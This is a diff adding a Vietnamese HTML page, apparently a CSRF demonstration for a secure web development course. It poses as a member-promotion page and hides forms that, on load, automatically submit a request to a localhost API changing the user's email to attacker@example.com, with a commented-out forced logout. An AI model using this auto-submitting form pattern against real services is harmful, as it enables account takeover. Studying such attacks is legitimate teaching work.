@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Ưu đãi thành viên – Demo CSRF</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f6fa;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background: #4a90e2;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            margin-top: 0;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 20px;
+            background: #4a90e2;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            margin-top: 15px;
+        }
+
+        .note {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Chương trình ưu đãi thành viên</h1>
+    </header>
+
+    <div class="container">
+        <h2>Đăng ký nhận ưu đãi đặc biệt</h2>
+        <p>
+            Đây là trang DEMO phục vụ báo cáo môn <b>Phát triển phần mềm web an toàn</b>.
+            Nội dung chỉ mang tính học thuật, mô phỏng một trang “khuyến mãi” nhằm trình diễn
+            cách một trang web độc hại có thể tự động gửi form CSRF mà người dùng không hay biết.
+        </p>
+
+        <a class="btn" href="#">Xem thêm ưu đãi</a>
+
+        <p class="note">*Lưu ý: Đây chỉ là minh hoạ CSRF trong môi trường localhost.</p>
+    </div>
+
+    <!-- Form CSRF gửi ngầm -->
+    <form id="csrfForm" action="http://localhost:5000/api/auth/email" method="POST">
+        <input type="hidden" name="new_email" value="attacker@example.com" />
+    </form>
+
+    <form id="csrfLogout" action="http://localhost:5000/api/auth/logout" method="POST"></form>
+
+    <script>
+        console.log("Attacker demo page loaded.");
+
+        window.onload = function () {
+            const f = document.getElementById("csrfForm");
+            console.log("Form đã sẵn sàng, sẽ submit sau 2 giây...");
+
+            // Delay 2 giây (2000 ms) rồi mới submit
+            setTimeout(function () {
+                if (f) {
+                    console.log("Đang submit form CSRF...");
+                    f.submit();
+
+                    // setTimeout(() => {
+                    //     console.log("Gửi CSRF logout");
+                    //     document.getElementById("csrfLogout").submit();
+                    // }, 500);
+                }
+            }, 2000);
+        };
+    </script>
+
+</body>
+
+</html>
